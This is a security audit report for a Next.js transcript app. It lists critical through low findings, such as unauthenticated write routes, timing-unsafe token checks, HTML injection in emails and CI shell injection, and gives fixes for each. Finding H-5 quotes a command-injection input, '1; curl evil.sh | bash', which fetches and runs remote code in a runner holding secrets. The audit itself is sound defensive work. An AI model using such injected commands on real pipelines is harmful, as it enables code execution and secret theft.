# Security audit recommendations

This document summarizes security findings for `transcript-app` and the recommended fixes. Grouped by severity. File paths and line numbers reference the tree as of commit `f65dc98`.

A local commit (`99e6eec`, "security: auth-gate mutating routes, fix email HTML escaping, actions command injection") implements the CRITICAL + HIGH fixes described below. It was kept on a fork-only workflow; maintainers can cherry-pick, review, or adapt as they see fit.

---

## Critical

### C-1. Unauthenticated transcript mutation — `PUT` / `DELETE /api/transcripts/[episode]`

`src/app/api/transcripts/[episode]/route.ts` — neither handler checks auth. Any anonymous caller can overwrite or delete any transcript in Vercel Blob. Because transcripts flow into Claude synthesis and the public search UI, this is a content-integrity / SEO / reputation attack surface.

**Fix:** gate both handlers with `checkAuth(request)` (the existing helper in `src/lib/podreview-auth.ts`). Return the standard 401 on failure before any work.

### C-2. Unauthenticated GitHub Actions dispatch — `POST /api/rebuild`

`src/app/api/rebuild/route.ts` accepts `{ episode }` and dispatches `ingest-episode.yml` via `GITHUB_PAT`. No auth check. Unbounded CI minutes + arbitrary workflow triggering by any anonymous caller.

**Fix:** require bearer auth; reject unauthenticated POSTs before issuing the workflow_dispatch.

### C-3. Unauthenticated transcript rename — `POST /api/transcript-rename`

`src/app/api/transcript-rename/route.ts` moves blobs with no auth. Anyone can reshuffle episode numbering and break the metadata↔transcript mapping.

**Fix:** `checkAuth(request)` at top of POST.

### C-4. Unauthenticated metadata write — `POST /api/admin-explore`

`src/app/api/admin-explore/route.ts` (new route) writes `data/episode-metadata.json` via `fs.writeFileSync`. On read-only Vercel FS the write silently fails, but dev and any writable-FS deploy accepts arbitrary mutations of episode metadata.

**Fix:** `checkAuth(request)` at top of POST.

### C-5. Unauthenticated guest image writes — `POST /api/guest-images`

`src/app/api/guest-images/route.ts` writes `data/guest-images.json`. No auth; only a weak URL blacklist. Attacker can repoint guest images to arbitrary URLs (trackers, hostile content).

**Fix:** `checkAuth(request)` at top of POST. Keep GET open (read-only list) if that's intentional.

### C-6. Unauthenticated LLM cost amplifier — `POST /api/guest-quote/regenerate`

`src/app/api/guest-quote/regenerate/route.ts` loops Claude over multiple transcripts per call and writes `data/guest-bios.json`. No auth, no rate limit. A single attacker can burn arbitrary Anthropic spend.

**Fix:** `checkAuth(request)` + cap on input size.

---

## High

### H-1. Non-constant-time token comparisons (+ fail-open on unset env)

Multiple files compare bearer tokens or passwords with `===`:

- `src/lib/podreview-auth.ts` — `auth.slice(7) === process.env.PODREVIEW_PASSWORD`
- `src/app/api/warmup/route.ts` — `provided !== token`, AND permits access when `WARMUP_TOKEN` is unset
- `src/app/api/podreview/auth/route.ts` — `password !== correct`
- `src/app/api/feedback/route.ts` — `auth !== 'Bearer ${FEEDBACK_API_TOKEN}'`, AND permits access when the env var is unset (leaks all stored feedback including user comments/names)

**Fix:**
1. Add a shared `safeEqual(a, b)` helper using `crypto.timingSafeEqual` (length-gated).
2. Invert the fail-open: when an env is missing, return 500 ("Not configured"), don't skip the check.

Reference pattern:
```ts
import { timingSafeEqual } from 'crypto';
export function safeEqual(a: string, b: string): boolean {
  const ab = Buffer.from(a);
  const bb = Buffer.from(b);
  if (ab.length !== bb.length) return false;
  return timingSafeEqual(ab, bb);
}
```

### H-2. HTML injection in outbound emails

`src/app/api/feedback/route.ts` and `src/app/api/transcription-error/route.ts` interpolate user input directly into HTML email bodies (name, query, comment, answer, selectedText, correctedText, originalText, etc.). Resend delivers them to the operator; attacker can craft convincing links, tracking pixels, hidden content.

**Fix:** add a local `escapeHtml()`:
```ts
function escapeHtml(s: unknown): string {
  return String(s ?? '')
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}
```
Apply to every user-controlled interpolation in both email templates.

### H-3. Unauthenticated endpoints that spend money or mutate state

All of these are POST/write handlers with no auth — anyone on the internet can invoke them, burning Anthropic or AssemblyAI spend, or writing to Blob:

- `src/app/api/feedback/route.ts` (POST) — blob write + Resend email, trivial spam/DoS
- `src/app/api/transcribe/route.ts` (POST) — starts paid AssemblyAI jobs; accepts arbitrary `audioUrl` (can transcribe any web audio and overwrite any episode number)
- `src/app/api/blob-upload/route.ts` — `onBeforeGenerateToken` mints 500 MB audio upload tokens with no caller check
- `src/app/api/cleanup-transcript/route.ts` (POST) — loops Claude Haiku over user-supplied `dialogues[]`
- `src/app/api/detect-samples/route.ts` (POST) — same shape
- `src/app/api/cleanup-feedback/route.ts` (POST) — blob writes; GET is admin-gated, POST is not
- `src/app/api/eval/feedback/route.ts` (POST) — blob writes
- `src/app/api/eval/generate/route.ts` (POST) — Claude calls per invocation
- `src/app/api/debug/route.ts` (POST) — calls Claude via `classifyQuery(query)`; looked like a dev leftover

**Fix:** `checkAuth(request)` at the top of each handler. For `/api/blob-upload`, call `checkAuth` against the outer request inside `onBeforeGenerateToken` and throw to translate to 401. Recommend deleting `/api/debug` if no longer used.

### H-4. AssemblyAI webhook not signature-verified

`src/app/api/transcribe/webhook/route.ts` — accepts any POST with a known `transcript_id` and refetches/overwrites the transcript. AssemblyAI supports a signing header (`webhook_auth_header_name` / `webhook_auth_header_value` on submit) but this app doesn't set or verify one.

**Fix:** set the auth header when submitting transcription jobs; verify the header on callbacks with `timingSafeEqual`. If `/api/transcribe/webhook` was being middleware-blocked, add it to the public-paths allowlist so legitimate AssemblyAI callbacks actually reach it.

### H-5. GitHub Actions shell injection in `ingest-episode.yml`

`.github/workflows/ingest-episode.yml` interpolates `${{ inputs.episode }}` directly into `run:` blocks (~lines 39, 46). A `workflow_dispatch` input like `1; curl evil.sh | bash` would execute in the runner with access to `BLOB_READ_WRITE_TOKEN`, `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `VERCEL_DEPLOY_HOOK_URL`.

Combined with C-2 (unauth'd `/api/rebuild`) this is unauthenticated RCE-in-CI with secret exfiltration.

**Fix:** use GitHub's documented mitigation — pass input through an env var:
```yaml
- name: Download transcript
  env:
    EPISODE: ${{ inputs.episode }}
  run: node --import tsx ./scripts/download-blob-transcript.ts "$EPISODE"
```
Apply the same pattern to both affected steps.

### H-6. Next.js DoS advisories (`next <16.2.3`)

`npm audit` reports several HIGH advisories in the pinned `next@16.1.x` — including GHSA-q4gf-8mx6-v5v3 (DoS with Server Components, CVSS 7.5) and GHSA-ggv3-7p47-pfv8 (rewrite HTTP smuggling). Transitive `undici <6.24.0` picks up HIGH advisories via Next.

Also: `package.json` pins `"next": "latest"` — non-reproducible builds. Recommend pinning an exact version.

**Fix:** `npm install next@^16.2.4` (or latest stable); pin explicitly. `npm audit fix` for transitive `minimatch`/`picomatch` ReDoS.

---

## Medium (worth considering but not urgent)

- **Prompt injection surface** in `/api/search`, `/api/search/stream`, `/api/search/followup`, `/api/synopsis`, `/api/kev`, `/api/tilda`. User query is interpolated into Claude prompts with only light framing. Recommend clear `<user_query>` delimiters in system prompt, length caps on user input, and for `/api/search/followup`, re-fetching sources server-side by `queryId` rather than trusting client-supplied `sources`.
- **Share endpoint** (`/api/share`) — unauth'd, creates public blobs, invokes Claude summarizer. Recommend auth or rate limit + tight content size caps.
- **SSRF** in `/api/guest-image-search` — `ig` and `x` query params interpolated into URLs without validation. Restrict handles to `^[a-zA-Z0-9._]{1,30}$` and URL-encode.
- **Public-access blob storage** (`access: 'public'` on feedback, eval, shares, query logs) — blob IDs are 6 base36 chars from `Math.random()`, so share URLs are enumerable. Consider `access: 'private'` + server-proxied reads, and `crypto.randomUUID()` for IDs.
- **Missing security headers** — no CSP, HSTS, X-Frame-Options, etc. Add a `headers()` block in `next.config.js`.
- **Mixed auth paradigms on podreview** — `/api/podreview/auth` accepts the password in the POST body, then every other podreview endpoint expects the same password as a `Bearer` token. Consider issuing a short-lived signed session token on successful password POST.

---

## Low

- `generateShareId` / `generateLogId` / `generateEvalId` use `Math.random()` — prefer `crypto.randomUUID()` or `crypto.randomBytes()`.
- `src/app/api/podreview/tmdb-search/route.ts` passes TMDB API key in the URL rather than the `Authorization: Bearer` header (the pattern already used in `admin-explore/tmdb-search`).
- `dotenv` in `dependencies` rather than `devDependencies`.
- Share ID validation uses `startsWith` + substring checks; a strict regex is safer.

---

## Summary

| Severity | Count | Status in local commit |
|---|---|---|
| Critical | 6 | All fixed |
| High | 6 | All fixed (H-6 partially — left pinned update as WIP) |
| Medium | 6 | Noted; not applied |
| Low | 4 | Noted; not applied |

Local commit: `99e6eec` on `transcript-app` fork master. Audit was independent and uses only public code; any maintainer who wants to adapt the fixes is welcome to cherry-pick or re-implement.
